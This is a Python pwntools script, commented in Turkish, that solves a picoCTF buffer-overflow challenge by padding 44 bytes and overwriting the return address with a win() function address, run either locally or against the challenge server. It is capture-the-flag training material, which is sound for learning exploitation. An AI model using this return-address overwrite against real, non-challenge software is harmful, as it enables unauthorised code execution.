#!/usr/bin/env python3
from pwn import *

# Binary ayarları
elf = ELF('./vuln')
context.binary = elf
context.log_level = 'debug'

# win() adresi
win_addr = 0x080491f6

# Offset hesapla (32 byte buffer + 12 byte için padding)
offset = 44

# Payload oluştur
payload = b'A' * offset
payload += p32(win_addr)

# Local veya Remote
if args.LOCAL:
    # Local test için flag.txt oluştur
    with open('flag.txt', 'w') as f:
        f.write('picoCTF{test_flag_local}\n')
    p = process('./vuln')
else:
    p = remote('saturn.picoctf.net', 64431)

# Exploit gönder
p.sendlineafter(b'string: ', payload)

# Flag'i al
p.interactive()
